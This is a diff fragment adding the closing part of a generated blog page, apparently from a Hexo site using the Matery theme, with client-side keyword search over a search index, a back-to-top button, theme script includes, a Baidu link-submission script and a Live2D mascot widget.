+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+    <script src="/js/snow.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/Epsilon2.1.model.json"},"display":{"position":"right","width":225,"height":450},"mobile":{"show":true,"react":{"opacity":0.7}}});</script></body>
+
+</html>
